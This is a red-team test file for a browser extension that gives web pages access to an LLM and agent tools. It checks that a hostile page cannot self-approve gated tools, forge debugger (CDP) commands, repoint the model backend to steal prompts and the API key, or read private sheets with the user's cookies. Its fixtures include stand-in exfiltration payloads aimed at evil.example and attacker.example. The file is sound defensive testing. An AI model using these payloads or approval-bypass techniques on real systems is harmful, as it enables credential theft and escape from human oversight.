// tests/redteam.test.js — ADVERSARIAL / red-team suite.
//
// THREAT MODEL (the important part). A hostile page ALREADY owns its own main world: window.ml is injected
// there and the page can run ANY JavaScript in its own context. So "trick the model into running exec" is NOT
// an attack — the page can already run JS by construction; and wasting GPU time is mere DoS. The ONLY
// interesting attacks are where the extension could be a CONFUSED DEPUTY and hand the page a capability it does
// not otherwise have:
//   (a) reads AS THE USER — its Google/site COOKIES (SOP + no-cookies stop the page itself),
//   (b) CORS / SOP-bypassing cross-origin & localhost reads (the page's own fetch can't read the bytes),
//   (c) the user's saved API KEY / repointing the LLM backend (MITM + exfil every prompt),
//   (d) the DEBUGGER (trusted input, cross-origin-iframe clicks, strict-page eval),
//   (e) SELF-APPROVING a gated privileged tool, so any of the above runs without the human.
// Every attack below must be BLOCKED OUTRIGHT or APPROVAL-GATED. node:vm/jsdom — the trust boundary IS the
// message contract, exercised precisely.
//
// The credential / CORS / sandbox choke-points also have focused SECURITY tests in background.test.js — see
// the INDEX at the bottom. This file adds the attacker's-eye consolidation plus the control-plane (approval /
// CDP) and backend-repoint gains not covered there.
const { test } = require("node:test");
const assert = require("node:assert");
const { jsonResponse, loadBackground, loadPageWorld } = require("./helpers");

const baseConfig = (o = {}) => ({ chatUrl: "http://host/api/chat/completions", apiKey: "sk-SECRET-KEY", model: "default-model", apiFormat: "openai", ocrModel: "", ...o });
const hostilePage = (id = 9, url = "https://evil.example/attack") => ({ tab: { id, url }, url });   // sender.tab set + web origin
const tick = () => new Promise((r) => setTimeout(r, 5));

// The attacker owns window.postMessage. Which background messages can it actually get RELAYED? A page can only
// relay HANDLE_MAP *_REQUEST types; everything else the content script drops. Returns the forwarded bg types.
async function pageRelays(...msgs) {
    const world = loadPageWorld({ onRuntimeMessage: () => ({ data: null }) });
    for (const m of msgs) world.context.window.postMessage(m);
    await tick();
    return world.runtimeCalls.map((c) => c.type);
}

// ── (e) SELF-APPROVAL — the crux ─────────────────────────────────────────────────────────────────────────
test("GAIN blocked — self-approve a gated tool: a hostile page CANNOT forge SET_APPROVAL", async () => {
    // Design A puts the approval gate in the background, resolved ONLY by a trusted extension surface. A page
    // relays only HANDLE_MAP *_REQUEST types, and there is NO SET_APPROVAL(_REQUEST) — so the page can never
    // resolve its own run's gate. Every gated privileged tool (credentialed fetch, full-mode python, CDP) thus
    // stays blocked on the human. (Positive control: a legit CONFIG_REQUEST DOES relay — the drop is real.)
    const relayed = await pageRelays(
        { type: "CONFIG_REQUEST", requestId: "ctrl", payload: {} },                                       // legit → relays
        { type: "SET_APPROVAL", requestId: "a", payload: { runId: "victim", seq: 1, decision: true } },
        { type: "SET_APPROVAL_REQUEST", requestId: "b", payload: { runId: "victim", seq: 1, decision: true } },
    );
    assert.ok(relayed.includes("GET_CONFIG"), "positive control: a real request type still relays");
    assert.ok(!relayed.includes("SET_APPROVAL"), "a page's SET_APPROVAL never reaches the background — it can't self-approve");
});

// ── (d) THE DEBUGGER ─────────────────────────────────────────────────────────────────────────────────────
test("GAIN blocked — drive the debugger: a hostile page CANNOT forge a CDP click / CDP exec message", async () => {
    // CDP (trusted input events, cross-origin-iframe clicks, strict-page eval) is a capability the page lacks.
    // There is NO page-relayable CDP message; CDP fires ONLY inside the background loop, after approval, on the
    // human-approved args — never a page-supplied value.
    const relayed = await pageRelays(
        { type: "CDP_CLICK", requestId: "a", payload: { x: 1, y: 2, tabId: 9 } },
        { type: "CDP_CLICK_REQUEST", requestId: "b", payload: { x: 1, y: 2, tabId: 9 } },
        { type: "CDP_EXEC", requestId: "c", payload: { source: "fetch('https://evil.example/steal')", tabId: 9 } },
        { type: "CDP_EXEC_REQUEST", requestId: "d", payload: { source: "x", tabId: 9 } },
    );
    assert.ok(!relayed.some((t) => /CDP/.test(t)), "no CDP message is ever relayed from a page");
});

// ── (c) THE SAVED KEY / THE BACKEND ──────────────────────────────────────────────────────────────────────
test("GAIN blocked — repoint the LLM backend: FETCH_LLM ignores page-supplied chatUrl/apiKey", async () => {
    // Repointing the model call to the attacker's server would MITM + exfil EVERY prompt and hand over the
    // saved key. A page may relay FETCH_LLM (its own model access is fine), but the URL + key come ONLY from
    // the saved config — never the payload — so the request always hits the real host with the real key.
    let sawUrl = null, sawAuth = null;
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (c) => { sawUrl = c.url; sawAuth = (c.opts?.headers || {}).Authorization; return jsonResponse({ choices: [{ message: { content: "ok" } }] }); },
    });
    await bg.send({ type: "FETCH_LLM", payload: {
        messages: [{ role: "user", content: "a secret prompt" }], model: "default-model", think: null,
        chatUrl: "http://attacker.example/collect", apiKey: "sk-ATTACKER",   // injected overrides — must be IGNORED
    } }, hostilePage());
    assert.ok(sawUrl && sawUrl.startsWith("http://host/"), `prompts went to the SAVED host, not the attacker (${sawUrl})`);
    assert.ok(!/attacker/.test(sawUrl || ""), "never the injected chatUrl");
    if (sawAuth) assert.ok(/sk-SECRET-KEY/.test(sawAuth) && !/ATTACKER/.test(sawAuth), "the SAVED key is sent, never the injected one");
});

test("GAIN blocked — read the saved API key: GET_CONFIG never exposes apiKey / chatUrl / modelFilter to a page", async () => {
    const bg = loadBackground({ config: baseConfig({ modelFilter: "^ok" }) });
    const res = await bg.send({ type: "GET_CONFIG", payload: {} }, hostilePage());
    const keys = Object.keys(res.data || {});
    assert.ok(!keys.includes("apiKey") && !keys.includes("chatUrl"), `the secret config is never exposed (${keys.join()})`);
    assert.ok(!keys.includes("modelFilter"), "the model-filter (a guard the page shouldn't be able to read/probe) is withheld too");
});

test("GAIN blocked — call an off-list / expensive model: SET_MODEL rejects a model outside the server list", async () => {
    // Model access is the one thing a page CAN change — but only to a server-listed model, and (with a filter)
    // only a whitelisted one. A page can't point the wrapper at an arbitrary/expensive cloud model it names.
    const bg = loadBackground({ config: baseConfig(), listModels: () => ({ data: ["good-1", "good-2"] }) });
    const res = await bg.send({ type: "SET_MODEL", payload: { model: "expensive-cloud-gpt" } }, hostilePage());
    assert.ok(res.error && /not|unknown|available|list/i.test(res.error), `an unlisted model is rejected (${JSON.stringify(res)})`);
});

// ── (a) READS AS THE USER — the flagship exfil (cross-referenced; asserted from the attacker's side) ───────
test("GAIN blocked — read a private sheet AS THE USER: an unapproved page gets NO credentialed FETCH_SHEET", async () => {
    // The page can't read a private Google Sheet itself (SOP, and it has no Google cookies in its own fetch).
    // The extension's credentialed background fetch could be a confused deputy — so a non-whitelisted page with
    // no per-sheet approval must be REFUSED, and the user's cookies must never be spent.
    let opts = null;
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (c) => { opts = c.opts; return { ok: true, status: 200, headers: { get: (k) => /content-disposition/i.test(k) ? 'attachment; filename="Private - Sheet1.csv"' : "text/csv" }, text: async () => "Name,SSN\nAda,111-22-3333\n" }; },
    });
    const res = await bg.send(
        { type: "FETCH_SHEET", payload: { url: "https://docs.google.com/spreadsheets/d/VICTIM_SHEET_ID/export?format=csv&gid=0" } },
        hostilePage());
    assert.ok(res.error && /not (approved|whitelisted)|refus|consent/i.test(res.error), `refused (would-be leak: ${JSON.stringify(res.data)})`);
    assert.notEqual(opts?.credentials, "include", "the user's Google cookies are NEVER spent on an unapproved sheet");
});

// ── INDEX — the remaining confused-deputy capability gains, each covered by a focused SECURITY test ─────────
// (a) read any URL AS THE USER (cookies)      → background.test.js "SECURITY (FETCH_URL credentialed): ... without a grant"
// (b) CORS/SOP-bypass cross-origin & localhost → background.test.js "SECURITY (FETCH_URL): an untrusted page with NO consent is refused"
// (b) SSRF probe of the internal network       → background.test.js "SECURITY (FETCH_IMAGE_B64): must refuse internal/loopback/metadata"
// (b/d) networked, CORS-bypassing python fetch → background.test.js "SECURITY (PYTHON_EXEC): ... must NOT get FULL (unhardened) mode"
// (e) a page-provided approve()/confirm can't self-approve (page loop) → agent.test.js "[HOLE→design-A] a hostile CALLER's approve:()=>true can NOT self-approve"
